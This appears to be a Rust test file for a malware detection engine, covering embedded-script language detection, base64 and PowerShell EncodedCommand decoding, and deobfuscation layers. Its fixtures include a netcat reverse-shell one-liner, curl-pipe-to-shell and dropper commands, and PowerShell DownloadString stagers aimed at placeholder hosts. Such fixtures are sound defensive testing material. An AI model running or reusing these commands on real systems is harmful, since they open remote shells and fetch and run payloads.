#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
use super::*;

#[test]
fn heuristic_quoted_origin_is_filtered_before_plain_findings_reach_host() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("traits.yaml");
    std::fs::write(
        &path,
        r#"
defaults:
  for: [shell]
  platforms: [unix, windows]
traits:
  - id: test/source::origin-probe
    desc: Origin scope regression probe
    crit: notable
    if: {type: text, substr: mkfifo}
    unless:
      - id: metadata/lang/source/origin::heuristic-quoted-source
"#,
    )
    .unwrap();
    let mapper = crate::capabilities::CapabilityMapper::from_yaml(&path).unwrap();
    let engine = crate::Engine::from_rules(std::sync::Arc::new(mapper));
    let code = "mkfifo /tmp/f; sh -c 'sh </tmp/f | nc example.test 4444 >/tmp/f' 2>/dev/null";
    let result = analyze_embedded_haystack(
        "carrier.py",
        code,
        32,
        &[],
        Some(crate::types::binary::StringType::ShellCmd),
        &engine,
        0,
        Some(&FileType::Python),
    )
    .unwrap();
    let EmbeddedAnalysisResult::PlainEmbedded(findings) = result else {
        panic!("plain string must remain a plain embedded unit");
    };
    assert!(
        findings
            .iter()
            .any(|f| f.id == "metadata/lang/embedded::shell")
    );
    assert!(!findings.iter().any(|f| f.id == HEURISTIC_QUOTED_ORIGIN_ID));
    assert!(!findings.iter().any(|f| f.id == "test/source::origin-probe"));
}

#[test]
fn plain_snippet_metrics_do_not_describe_the_host() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("traits.yaml");
    std::fs::write(
        &path,
        r#"
defaults:
  for: [shell]
  platforms: [unix, windows]
traits:
  - id: test/snippet::many-lines
    desc: Source has at least thirty lines
    crit: notable
    if: {type: metrics, field: text.lines, min: 30}
  - id: test/snippet::marker
    desc: Source contains snippet marker
    crit: notable
    if: {type: text, substr: snippet_evidence_marker}
"#,
    )
    .unwrap();
    let mapper = crate::capabilities::CapabilityMapper::from_yaml(&path).unwrap();
    let engine = crate::Engine::from_rules(std::sync::Arc::new(mapper));
    let code = format!(
        "mkfifo /tmp/f; sh -c 'sh </tmp/f | nc example.test 4444 >/tmp/f' 2>/dev/null\n{}echo snippet_evidence_marker\n",
        "echo ordinary\n".repeat(35)
    );
    let standalone = UnifiedSourceAnalyzer::for_file_type(&FileType::Shell)
        .unwrap()
        .with_engine(engine.clone())
        .without_embedded_detection()
        .analyze_source_as_configured(Path::new("snippet.sh"), &code);
    assert!(
        standalone
            .findings
            .iter()
            .any(|f| f.id == "test/snippet::many-lines")
    );

    let result = analyze_embedded_haystack(
        "carrier.py",
        &code,
        32,
        &[],
        Some(crate::types::binary::StringType::ShellCmd),
        &engine,
        0,
        Some(&FileType::Python),
    )
    .unwrap();
    let EmbeddedAnalysisResult::PlainEmbedded(findings) = result else {
        panic!("plain string must remain a plain embedded unit");
    };
    assert!(findings.iter().any(|f| f.id == "test/snippet::marker"));
    assert!(!findings.iter().any(|f| f.id == "test/snippet::many-lines"));
}

/// Script-deobfuscation layers name themselves from a closed set; each
/// must be listed so its `metadata/lang/encoding/layer::<name>` id validates.
#[test]
fn deobfuscation_layers_are_known_encoded_layer_names() {
    use stng::script::ScriptLanguage;
    for (language, chain) in [
        (
            ScriptLanguage::PowerShell,
            "powershell:encodedcommand+utf16le",
        ),
        (ScriptLanguage::PowerShell, "powershell:iex"),
        (ScriptLanguage::Python, "python:base64+zlib"),
        (ScriptLanguage::Php, "php:gzinflate+base64_decode"),
    ] {
        let result =
            stng::script::DeobfuscationResult::new(String::new(), 0, chain.to_string(), language);
        for step in encoding_chain_for_deobfuscation(&result) {
            assert!(
                ENCODED_LAYER_NAMES.contains(&step.as_str()),
                "{chain} -> {step}"
            );
        }
    }
    assert!(ENCODED_LAYER_NAMES.contains(&"unicode-variation-selector"));
}

#[test]
fn wide_encoded_layer_emits_registered_metadata() {
    let findings = generate_encoded_layer_traits(&["wide".to_string()], 0x40);
    assert_eq!(findings.len(), 1);
    assert_eq!(
        findings[0].id.as_ref(),
        "metadata/lang/encoding/layer::wide"
    );
    assert_eq!(findings[0].evidence[0].location.as_deref(), Some("0x40"));
}

fn make_string_info(value: &str) -> StringInfo {
    StringInfo {
        value: (value.to_string()).into(),
        offset: Some(0),
        string_type: None,
        encoding: "utf-8".to_string(),
        section: None,
        encoding_chain: Vec::new(),
        fragments: None,
    }
}

fn make_string_info_at_offset(value: &str, offset: u64) -> StringInfo {
    let mut info = make_string_info(value);
    info.offset = Some(offset);
    info
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_detect_python() {
    // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
    let code = "import os\nimport sys\ndef main():\n    os.system('ls -la')\n    sys.exit(0)";
    let info = make_string_info(code);
    assert_eq!(detect_language(&info, false), Some(FileType::Python));
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_detect_javascript() {
    // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
    let code =
        "function test() {\n  const x = require('fs');\n  eval(x);\n  console.log('done');\n}";
    let info = make_string_info(code);
    assert_eq!(detect_language(&info, false), Some(FileType::JavaScript));
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_suppress_plain_js_in_c_family_host() {
    // Go (and other curly-brace languages) share C-style syntax with JavaScript,
    // so the host's own plain source is readily misclassified as embedded JS. That
    // leaked JS-only traits onto, e.g., Go's `db.Exec(` under a JavaScript-typed
    // sub-report. Plain JS detection must be suppressed when the host is C-family.
    let code =
        "function test() {\n  const x = require('fs');\n  eval(x);\n  console.log('done');\n}";
    let info = make_string_info(code);

    // No host context: still detected as JavaScript (unchanged behaviour).
    assert_eq!(detect_language(&info, false), Some(FileType::JavaScript));

    // C-family hosts suppress the plain self-match.
    for host in [
        FileType::Go,
        FileType::Rust,
        FileType::C,
        FileType::Java,
        FileType::CSharp,
    ] {
        assert_eq!(
            detect_language_with_host(&info, false, Some(&host)),
            None,
            "plain JS should be suppressed in {host:?} host",
        );
    }

    // A non-C-family host (e.g. Python) is unaffected.
    assert_eq!(
        detect_language_with_host(&info, false, Some(&FileType::Python)),
        Some(FileType::JavaScript),
    );
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_encoded_js_in_c_family_host_still_detected() {
    // An *encoded* JS payload inside a C-family host is a genuine hidden-payload
    // signal and must still surface — only PLAIN self-matches are suppressed.
    let code =
        "function test() {\n  const x = require('fs');\n  eval(x);\n  console.log('done');\n}";
    let info = make_string_info(code);
    assert_eq!(
        detect_language_with_host(&info, true, Some(&FileType::Go)),
        Some(FileType::JavaScript),
    );
}

#[test]
fn test_skip_plain_component_markup_in_component_host() {
    let mut info = make_string_info(
        "<script>\n  let count = 0;\n</script>\n\
             <button class=\"primary\" onclick={() => count += 1}>Click</button>",
    );
    // This is the bad upstream classification shape from stng: component
    // markup with `class` and method-like expressions can look Python-ish.
    info.string_type = Some(crate::types::binary::StringType::PythonCode);

    assert!(should_skip_component_source_markup(
        "Component.svelte",
        &info,
        Some(&FileType::JavaScript),
    ));
    assert!(
        !should_skip_component_source_markup("page.html", &info, Some(&FileType::Html)),
        "ordinary HTML remains eligible for embedded-code analysis",
    );

    let engine = crate::Engine::from_rules(std::sync::Arc::new(
        crate::capabilities::CapabilityMapper::new_without_validation(),
    ));
    let (encoded_layers, plain_findings) = process_all_strings(
        "Component.svelte",
        &[info],
        &engine,
        0,
        Some(&FileType::JavaScript),
        None,
    );

    assert!(encoded_layers.is_empty());
    assert!(
        plain_findings
            .iter()
            .all(|f| f.id != "metadata/lang/embedded::python"),
        "component source markup should not be reported as embedded Python"
    );
}

#[test]
#[allow(clippy::unwrap_used)]
fn typed_encoding_context_is_visible_during_layer_evaluation() {
    let rules = tempfile::NamedTempFile::new().unwrap();
    std::fs::write(
        rules.path(),
        r#"
composite_rules:
  - id: fixture/context::typed-layer
    desc: Typed reconstructed source context
    crit: notable
    platforms: [windows]
    for: [powershell]
    all:
      - id: metadata/lang/encoding/layer::powershell-literal-program
"#,
    )
    .unwrap();
    let engine = crate::Engine::from_rules(std::sync::Arc::new(
        crate::capabilities::CapabilityMapper::from_yaml(rules.path()).unwrap(),
    ));
    let layer = analyze_decoded_script_layer(
        "sample.py",
        "Write-Output 'ordinary reconstruction control'",
        123,
        FileType::PowerShell,
        vec!["powershell-literal-program".to_string()],
        &engine,
        0,
        false,
    )
    .unwrap();
    assert!(
        layer
            .findings
            .iter()
            .any(|finding| finding.id == "fixture/context::typed-layer")
    );
    assert_eq!(
        layer
            .findings
            .iter()
            .filter(
                |finding| finding.id == "metadata/lang/encoding/layer::powershell-literal-program"
            )
            .count(),
        1
    );
}

#[test]
fn test_short_base64_source_map_javascript_is_analyzed() {
    let value = "const JWTSECRET = process.env.JWTSECRET;\nconst ENDPOINT_CONFIG = { API_GATEWAY: \"aHR0cHM6Ly9leGFtcGxlLmNvbQ==\" };\nmodule.exports = ENDPOINT_CONFIG;";
    let mut info = make_string_info(value);
    info.encoding_chain = vec!["base64".to_string()];
    let result = analyze_embedded_string(
        "package/init.ts.map",
        &info,
        0,
        &crate::Engine::empty(),
        0,
        Some(&FileType::Data),
    );
    assert!(
        matches!(&result, Ok(EmbeddedAnalysisResult::EncodedLayer(_))),
        "encoded source-map JavaScript should become a typed layer: {result:?}",
    );
    if let Ok(EmbeddedAnalysisResult::EncodedLayer(layer)) = result {
        assert_eq!(layer.file_type, "javascript");
        assert!(layer.path.contains("##base64@0"));
    }
}

#[test]
fn test_decode_depth_limit_reports_an_incomplete_layer() {
    let value = "const cp = require('child_process');\ncp.exec('curl https://evil.example/x | sh');\nmodule.exports = cp;";
    let mut info = make_string_info(value);
    info.encoding_chain = vec!["base64".to_string()];
    let result = analyze_embedded_string(
        "pkg/index.js",
        &info,
        0,
        &crate::Engine::empty(),
        MAX_DECODE_DEPTH,
        Some(&FileType::JavaScript),
    );
    let Ok(EmbeddedAnalysisResult::EncodedLayer(layer)) = result else {
        panic!("a too-deep encoded payload must still be reported: {result:?}");
    };
    assert!(
        layer
            .analysis_gaps
            .contains(crate::types::AnalysisGap::EmbeddedSourceIncomplete)
    );
    assert!(!layer.findings.is_empty(), "encoding-layer traits are kept");
}

#[test]
fn test_reject_source_map_payload() {
    let source_map = r#"{"version":3,"sources":["x.js"],"names":[],"mappings":"AAAA","sourcesContent":["function test(){return 1;}"]}"#;
    let info = make_string_info(source_map);
    assert_eq!(detect_language(&info, true), None);
}

#[test]
fn test_dedup_identical_base64_binary_payloads() {
    use base64::Engine;

    let mut payload = Vec::with_capacity(192);
    payload.extend_from_slice(&[0x1F, 0x8B, 0x08, 0x00]);
    payload.resize(192, 0u8);
    let payload = base64::engine::general_purpose::STANDARD.encode(&payload);
    let strings = vec![
        make_string_info_at_offset(&payload, 0x230),
        make_string_info_at_offset(&payload, 0x231),
    ];
    let engine = crate::Engine::from_rules(std::sync::Arc::new(
        crate::capabilities::CapabilityMapper::new_without_validation(),
    ));

    let (encoded_layers, plain_findings) =
        process_all_strings("sample.ts", &strings, &engine, 0, None, None);

    assert!(plain_findings.is_empty());
    // Dedup contract — two identical base64 strings produce one
    // *carrier* layer with file_type=gz, regardless of any extra
    // archive-analyzer entries the unified sub-file dispatcher
    // may append below the carrier. Count carriers, not total
    // entries, so this test stays stable across dispatcher
    // changes that add or remove nested-extraction entries.
    let carriers: Vec<_> = encoded_layers
        .iter()
        .filter(|f| f.file_type == "gz" && f.encoding.is_some())
        .collect();
    assert_eq!(
        carriers.len(),
        1,
        "expected exactly one gz carrier, got {} (full layers: {:?})",
        carriers.len(),
        encoded_layers
            .iter()
            .map(|f| (&f.path, &f.file_type, &f.encoding))
            .collect::<Vec<_>>(),
    );
}

/// Regression: plain-embedded findings must carry parent-relative
/// offsets and `embedded@<parent-offset>:` location prefixes when
/// bubbled up to the parent. Without parent offsets, proximity
/// checks at the parent level (`near_lines`/`near_bytes`) bucket
/// every extracted snippet at line 1, so `chmod +x` in one
/// Dockerfile RUN block and `curl -o` in the next look like
/// separate sections instead of nearby lines in the source file.
#[test]
#[allow(clippy::unwrap_used)]
fn test_plain_embedded_offsets_are_parent_relative() {
    // Two shell snippets at known parent offsets, large enough to
    // be classified as shell by the detector. The first snippet
    // contains a stage-path reference; the second contains
    // `chmod +x`. After analysis, evidence offsets must be
    // parent-relative (snippet offset + inner offset) so the
    // parent's proximity calculations measure real distance.
    let parent_offset_a: u64 = 0x40;
    let parent_offset_b: u64 = 0xd0;
    let curl_snippet = "curl -skL https://example.com/payload -o /tmp/.sshd 2>/dev/null";
    let chmod_snippet =
        "chmod +x /tmp/.sshd\n/tmp/.sshd &\nls /tmp\necho done\nexit 0\n# pad to threshold";

    let strings = vec![
        make_string_info_at_offset(curl_snippet, parent_offset_a),
        make_string_info_at_offset(chmod_snippet, parent_offset_b),
    ];

    let engine = crate::Engine::from_rules(std::sync::Arc::new(
        crate::capabilities::CapabilityMapper::new_without_validation(),
    ));
    let (_encoded, plain_findings) =
        process_all_strings("Dockerfile", &strings, &engine, 0, None, None);

    let any_parent_relative =
        plain_findings
            .iter()
            .flat_map(|f| f.evidence.iter())
            .any(
                |ev| match (ev.location.as_deref(), ev.offsets.first().copied()) {
                    (Some(loc), Some(off)) => {
                        loc.starts_with(&format!("embedded@{:#x}:", parent_offset_a))
                            && off >= parent_offset_a
                            || loc.starts_with(&format!("embedded@{:#x}:", parent_offset_b))
                                && off >= parent_offset_b
                    }
                    _ => false,
                },
            );
    assert!(
        any_parent_relative,
        "expected at least one `embedded@<offset>:` finding with a parent-relative offset; \
             got {} findings without one (regression: extracted-snippet proximity broke for \
             Dockerfile/GitHub Actions fixtures)",
        plain_findings.len(),
    );
}

#[test]
fn test_top_level_self_detection_for_php_is_suppressed() {
    assert!(is_top_level_self_detection(
        "archive.zip!!src/ParseException.php",
        false,
        0,
        &FileType::Php,
        None,
    ));
    assert!(!is_top_level_self_detection(
        "archive.zip!!src/ParseException.php",
        true,
        0,
        &FileType::Php,
        None,
    ));
    assert!(!is_top_level_self_detection(
        "archive.zip!!src/ParseException.php",
        false,
        32,
        &FileType::Php,
        None,
    ));
    assert!(is_top_level_self_detection(
        "archive.zip!!src/ParseException.php",
        false,
        0,
        &FileType::JavaScript,
        None,
    ));

    assert!(is_top_level_self_detection(
        "agildodock.install",
        false,
        0,
        &FileType::Shell,
        Some(&FileType::Shell),
    ));
}

#[test]
fn test_top_level_self_detection_for_c_shell_misclassification_is_suppressed() {
    assert!(is_top_level_self_detection(
        "include/sound/sdca_function.h",
        false,
        0,
        &FileType::Shell,
        None,
    ));
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_detect_shell() {
    // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
    let code = "#!/bin/bash\necho 'hello world'\ncurl http://example.com/payload\nsh -c 'payload'";
    let info = make_string_info(code);
    assert_eq!(detect_language(&info, false), Some(FileType::Shell));
}

#[test]
fn test_reject_xor_gibberish_misclassified_as_shell() {
    let gibberish = "`(1 89;5dy3;+$-j1=17q8m*`g^LE";
    let info = StringInfo {
        value: (gibberish.to_string()).into(),
        offset: Some(0x27f6),
        string_type: Some(crate::types::binary::StringType::ShellCmd),
        encoding: "utf-8".to_string(),
        section: None,
        encoding_chain: vec!["xor".to_string()],
        fragments: None,
    };
    assert_eq!(detect_language(&info, true), None);
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_detect_php() {
    // Make string > MIN_PLAIN_SIZE (50 bytes) for plain detection
    let code = "<?php eval(base64_decode('test')); echo 'malware'; ?>";
    let info = make_string_info(code);
    assert_eq!(detect_language(&info, false), Some(FileType::Php));
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_reject_phpish_binary_noise() {
    let noise = "p`phpfpp`phpjp`phpp`phpfp`phpjp`phpfpp`phpjp`php";
    let info = StringInfo {
        value: (noise.to_string()).into(),
        offset: Some(0),
        string_type: Some(crate::types::binary::StringType::PhpCode),
        encoding: "utf-8".to_string(),
        section: None,
        encoding_chain: Vec::new(),
        fragments: None,
    };
    assert_eq!(detect_language(&info, false), None);
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_reject_plain_text() {
    let text = "This is just some regular text without code.";
    let info = make_string_info(text);
    assert_eq!(detect_language(&info, false), None);
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_reject_too_small() {
    let code = "import os"; // Less than MIN_PLAIN_SIZE
    let info = make_string_info(code);
    assert_eq!(detect_language(&info, false), None);
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_encoded_lower_threshold() {
    let code = "import os\ndef main():\n    pass"; // Only 1 match
    let info = make_string_info(code);
    assert_eq!(detect_language(&info, true), Some(FileType::Python));
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_entropy_calculation() {
    let data = b"aaaaaaaaaa";
    let entropy = crate::entropy::shannon(data);
    assert!(entropy < 1.0); // Low entropy

    // Use more varied data for higher entropy test
    let varied = b"abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
    let entropy = crate::entropy::shannon(varied);
    assert!(entropy > 3.0); // Higher entropy (many unique bytes)
}

// ── base64 binary detection tests ─────────────────────────────────────────

#[test]
#[allow(clippy::unwrap_used)]
fn test_looks_like_base64_valid() {
    // 96 bytes → 128-char base64 (> MIN_BASE64_LEN=100)
    use base64::Engine;
    let raw = b"Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!Hello World!";
    let s = base64::engine::general_purpose::STANDARD.encode(raw);
    assert!(
        s.len() >= MIN_BASE64_LEN,
        "test string too short: {}",
        s.len()
    );
    assert!(looks_like_base64(&s));
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_looks_like_base64_too_short() {
    assert!(!looks_like_base64("SGVsbG8="));
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_looks_like_base64_rejects_prose() {
    let prose = "This is a normal English sentence with spaces and punctuation, which is definitely not base64 encoded binary content at all.";
    assert!(!looks_like_base64(prose));
}

#[test]
fn alternate_permutation_is_admitted_to_literal_analysis() {
    assert!(host_may_contain_script_obfuscation("5145329 charAt"));
    assert!(!host_may_contain_script_obfuscation("5145329"));
}

#[test]
fn vbscript_encoder_yields_a_typed_nonrecursive_layer() {
    let bytes = b"#@~^vQAAAA==\x09Um.bn:RZM2mP+K4B2;YcEq?mMrwDR?4nsVr#cIixE^sN~z1~m\x7fDO;DkV~R!Dsmm^4+~ /aVkDP WP4YOwk)&&k+m!.+.yl^rU+kRDW2zrhmonRDaY,]Onsw]wwb:Co\x7f D6O,[LPYb:\x7fGEDPXPLP.nT/\x5cMf c+6\x7f~&/,]D+hwYw'khlTnRD6OEB!~O.!2wEAAAA==^#~@\x0d\x0a";
    let text = std::str::from_utf8(bytes).unwrap();
    assert!(host_may_contain_script_obfuscation(text));
    let layers = analyze_script_deobfuscation_layers("renamed.vbe", text, &test_mapper(), 0, None);
    assert_eq!(layers.len(), 1);
    assert_eq!(layers[0].file_type, "vbs");
    assert!(layers[0].path.contains("script"));
    assert!(
        analyze_script_deobfuscation_layers(
            "renamed.vbe",
            text,
            &test_mapper(),
            MAX_DECODE_DEPTH,
            None
        )
        .is_empty()
    );
    assert!(
        analyze_script_deobfuscation_layers("broken.vbe", "#@~^truncated", &test_mapper(), 0, None)
            .is_empty()
    );
}

fn test_mapper() -> crate::Engine {
    crate::Engine::empty()
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_detect_base64_binary_gzip() {
    // Keep this above the compressed-payload floor so real wrappers still detect.
    let mut payload = Vec::with_capacity(192);
    payload.extend_from_slice(&[0x1F, 0x8B, 0x08, 0x00]); // gzip magic
    payload.resize(192, 0u8);
    use base64::Engine;
    let encoded = base64::engine::general_purpose::STANDARD.encode(&payload);
    assert!(
        encoded.len() >= MIN_BASE64_LEN,
        "encoded too short: {}",
        encoded.len()
    );
    let info = make_string_info(&encoded);
    let entries = detect_base64_binary("test.sh", &info, 0, &test_mapper());
    assert!(
        !entries.is_empty(),
        "should detect base64-encoded gzip payload"
    );
    let carrier = &entries[0];
    assert!(
        carrier
            .findings
            .iter()
            .any(|f| f.id.contains("base64-decoded-gz")),
        "expected base64-gz finding, got: {:?}",
        carrier.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_detect_base64_binary_rejects_random() {
    use base64::Engine;
    let random_bytes: Vec<u8> = (0u8..=127).collect();
    let encoded = base64::engine::general_purpose::STANDARD.encode(&random_bytes);
    let info = make_string_info(&encoded);
    assert!(detect_base64_binary("test.sh", &info, 0, &test_mapper()).is_empty());
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_detect_base64_zip_is_metadata_and_still_analyzes_members() {
    use base64::Engine;
    use std::io::{Cursor, Write};

    let mut archive = zip::ZipWriter::new(Cursor::new(Vec::new()));
    archive
        .start_file("member.js", zip::write::SimpleFileOptions::default())
        .unwrap();
    archive
        .write_all(b"console.log('embedded archive content is still analyzed');\n")
        .unwrap();
    let bytes = archive.finish().unwrap().into_inner();
    let encoded = base64::engine::general_purpose::STANDARD.encode(bytes);
    let info = make_string_info(&encoded);
    let entries = detect_base64_binary("assets.js", &info, 0, &test_mapper());
    let carrier = &entries[0].findings[0];
    assert_eq!(
        carrier.id.as_ref(),
        "metadata/file/encoding::base64-decoded-zip"
    );
    assert_eq!(carrier.crit, Criticality::Notable);
    assert!(carrier.attack.is_none());
    assert!(
        entries
            .iter()
            .any(|entry| { entry.path.ends_with("member.js") && entry.file_type == "javascript" })
    );
}

fn append_tar_test_file(archive: &mut tar::Builder<Vec<u8>>, path: &str, data: &[u8]) {
    let mut header = tar::Header::new_gnu();
    header.set_size(data.len() as u64);
    header.set_mode(0o644);
    header.set_cksum();
    archive.append_data(&mut header, path, data).unwrap();
}

fn make_firefox_profile_tar_xz(include_extra_payload: bool) -> Vec<u8> {
    use std::io::Write;

    let mut archive = tar::Builder::new(Vec::new());
    append_tar_test_file(
        &mut archive,
        "profiles.ini",
        b"[Profile0]\nName=default-release\nIsRelative=1\nPath=4xutesqi.default-release\n",
    );
    append_tar_test_file(
        &mut archive,
        "installs.ini",
        b"[Install123]\nDefault=4xutesqi.default-release\nLocked=1\n",
    );
    append_tar_test_file(
        &mut archive,
        "nqpbh019.default/times.json",
        b"{\"created\":1684401674176,\"firstUse\":null}\n",
    );
    if include_extra_payload {
        append_tar_test_file(&mut archive, "payload.exe", b"MZ\0\0embedded payload");
    }
    archive.finish().unwrap();
    let tar_bytes = archive.into_inner().unwrap();

    let mut encoder = xz2::write::XzEncoder::new(Vec::new(), 6);
    encoder.write_all(&tar_bytes).unwrap();
    encoder.finish().unwrap()
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_detect_base64_binary_skips_firefox_profile_test_fixture_by_content() {
    use base64::Engine;

    let payload = make_firefox_profile_tar_xz(false);
    assert!(payload.len() >= MIN_BASE64_COMPRESSED_SIZE);
    let encoded = base64::engine::general_purpose::STANDARD.encode(payload);
    let info = make_string_info(&encoded);

    assert!(
        detect_base64_binary(
            "browser_cookie3-0.20.0.tar.gz!!tests/test_browsers.py",
            &info,
            0,
            &test_mapper(),
        )
        .is_empty()
    );
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_detect_base64_binary_does_not_skip_other_payloads_by_test_path() {
    use base64::Engine;

    let payload = make_firefox_profile_tar_xz(false);
    let encoded = base64::engine::general_purpose::STANDARD.encode(payload);
    let info = make_string_info(&encoded);
    assert!(
        !detect_base64_binary("package/src/payload.py", &info, 0, &test_mapper()).is_empty(),
        "profile metadata outside a test harness remains suspicious"
    );

    let payload = make_firefox_profile_tar_xz(true);
    let encoded = base64::engine::general_purpose::STANDARD.encode(payload);
    let info = make_string_info(&encoded);
    assert!(
        !detect_base64_binary("tests/test_browsers.py", &info, 0, &test_mapper()).is_empty(),
        "additional payload members prevent the fixture exemption"
    );
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_detect_base64_binary_rejects_tiny_elf_fixture() {
    let encoded = "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB\
AAAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAfQAAAAAAAAB9AAAAAAAAAAAA\
IAAAAAAAsDyZDwU=";
    let info = make_string_info(encoded);
    assert!(detect_base64_binary("test.go", &info, 0, &test_mapper()).is_empty());
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_detect_base64_binary_ignores_carrier_path() {
    // Path components are attacker-chosen: a package can name any file
    // `testdata/` or `sudo-prompt/`. They must not hide an embedded archive.
    let mut payload = Vec::with_capacity(192);
    payload.extend_from_slice(&[0x1F, 0x8B, 0x08, 0x00]);
    payload.resize(192, 0u8);
    use base64::Engine;
    let encoded = base64::engine::general_purpose::STANDARD.encode(&payload);
    let info = make_string_info(&encoded);
    for path in [
        "node_modules/evil/payload.js",
        "node_modules/evil/testdata/payload.js",
        "node_modules/evil/fixtures/payload.js",
        "node_modules/sudo-prompt/index.js",
        "node_modules/@mongodb-js/saslprep/dist/code-points-data.js",
        "pkg/payload_test.go",
        "lib/payload.spec.js",
    ] {
        assert!(
            !detect_base64_binary(path, &info, 0, &test_mapper()).is_empty(),
            "{path} must not suppress the embedded archive"
        );
    }
}

#[test]
fn test_detect_base64_binary_skipped_at_depth_gt_0() {
    use base64::Engine;
    let mut payload = vec![0x1F, 0x8Bu8, 0x08, 0x00];
    payload.resize(75, 0u8);
    let encoded = base64::engine::general_purpose::STANDARD.encode(&payload);
    let info = make_string_info(&encoded);
    assert!(detect_base64_binary("test.sh", &info, 1, &test_mapper()).is_empty());
}

// ── PowerShell -EncodedCommand tests ──────────────────────────────────────

#[test]
#[allow(clippy::unwrap_used)]
fn test_extract_ps_encoded_arg_found() {
    let s = "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAA==";
    assert!(extract_ps_encoded_arg(s).is_some());
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_extract_ps_encoded_arg_not_found() {
    let s = "powershell -Command Write-Output hello";
    assert!(extract_ps_encoded_arg(s).is_none());
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_has_ps_keywords_positive() {
    let s = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com')";
    assert!(has_ps_keywords(s));
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_has_ps_keywords_negative() {
    let s = "echo hello world";
    assert!(!has_ps_keywords(s));
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_decode_utf16le_valid() {
    use base64::Engine;
    let utf16: Vec<u8> = "IEX".encode_utf16().flat_map(u16::to_le_bytes).collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16);
    let result = decode_utf16le(&b64);
    assert_eq!(result.as_deref(), Some("IEX"));
}

#[test]
fn encoded_powershell_is_notable_without_behavioral_evidence() {
    assert_eq!(
        encoded_powershell_finding("test.vbs", 20, 0).crit,
        Criticality::Notable
    );
}

#[test]
#[allow(clippy::unwrap_used)]
fn test_decode_utf16le_invalid_odd_length() {
    use base64::Engine;
    let bytes = vec![0x41u8, 0x00, 0x42]; // odd length
    let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
    assert!(decode_utf16le(&b64).is_none());
}

#[test]
fn test_is_real_shell_rejects_cli_help_snippet() {
    let s = "Binary output can mess up your terminal. Use \"--output -\" to tell curl to output it to your terminal anyway, or consider \"--output <FILE>\".";
    assert!(!is_real_shell(s));
}

#[test]
fn test_script_deobfuscation_layers_powershell_encoded_command() {
    use base64::Engine;
    let ps_code =
        "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
    let utf16le: Vec<u8> = ps_code.encode_utf16().flat_map(u16::to_le_bytes).collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16le);
    let ps = format!(
        "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {b64}\n"
    );
    let layers = analyze_script_deobfuscation_layers("stager.ps1", &ps, &test_mapper(), 0, None);
    assert!(
        layers.iter().any(|file| {
            file.findings
                .iter()
                .any(|finding| finding.id.contains("base64-powershell"))
        }),
        "expected EncodedCommand layer from stng deobfuscator"
    );
}

#[test]
fn test_script_deobfuscation_layers_python_exec_b64() {
    let src = concat!(
        "#!/usr/bin/env python3\nimport base64\n",
        "exec(base64.b64decode(\"cHJpbnQoJ2hlbGxvIGZyb20gbWFsd2FyZScp\"))\n",
    );
    let layers = analyze_script_deobfuscation_layers("drop.py", src, &test_mapper(), 0, None);
    assert!(
        layers.iter().any(|file| {
            file.encoding
                .as_ref()
                .is_some_and(|chain| chain.iter().any(|step| step == "script"))
        }),
        "expected script-decoded python layer"
    );
}

#[test]
fn test_source_map_key_names_do_not_hide_payloads_in_scripts() {
    use base64::Engine;
    let ps_code =
        "IEX(New-Object Net.WebClient).DownloadString('http://evil.example.com/stage2.ps1')";
    let utf16le: Vec<u8> = ps_code.encode_utf16().flat_map(u16::to_le_bytes).collect();
    let b64 = base64::engine::general_purpose::STANDARD.encode(&utf16le);
    let mut strings: Vec<StringInfo> = ["version", "sources", "mappings", "sourcesContent"]
        .into_iter()
        .map(make_string_info)
        .collect();
    strings.push(make_string_info(&format!(
        "powershell.exe -EncodedCommand {b64}\n"
    )));
    let engine = test_mapper();
    let fired = |host: FileType| {
        let (layers, _) = process_all_strings("index.js", &strings, &engine, 0, Some(&host), None);
        layers.iter().any(|file| {
            file.findings
                .iter()
                .any(|f| f.id.contains("base64-powershell"))
        })
    };
    assert!(
        fired(FileType::JavaScript),
        "planted key names must not disable analysis"
    );
    assert!(!fired(FileType::Json), "a JSON source map is data");
}

#[test]
fn test_process_all_strings_skips_encoded_command_when_asked() {
    use base64::Engine;
